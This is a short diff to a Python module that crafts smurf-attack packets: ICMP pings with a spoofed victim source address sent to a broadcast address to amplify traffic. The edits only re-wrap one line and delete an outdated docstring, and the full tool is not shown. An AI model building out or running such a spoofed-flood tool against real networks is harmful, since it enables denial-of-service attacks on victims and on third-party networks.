@@ -11,7 +11,8 @@ LOG = logging.getLogger(__name__)
 
 def generate_smurf_packet(source_ip, dest_ip, payload_size=56):
     payload = generate_ping_ip_payload(1, 1, payload_size)
-    packet_data = generate_ip_packet(dest_ip, IPPROTO_ICMP, payload, source_addr=source_ip)
+    packet_data = generate_ip_packet(
+        dest_ip, IPPROTO_ICMP, payload, source_addr=source_ip)
     return packet_data
 
 
@@ -30,9 +31,6 @@ def _smurf(source_ip, dest_ip, payload_size):
 
 
 def smurf(target, broadcast_addr, count=4, payload_size=56):
-    """Send `count` pings to `dest_addr` with the given `timeout` and display
-    the result.
-    """
     try:
         dest_addr = socket.gethostbyname(target)
         frame_size = payload_size + 28
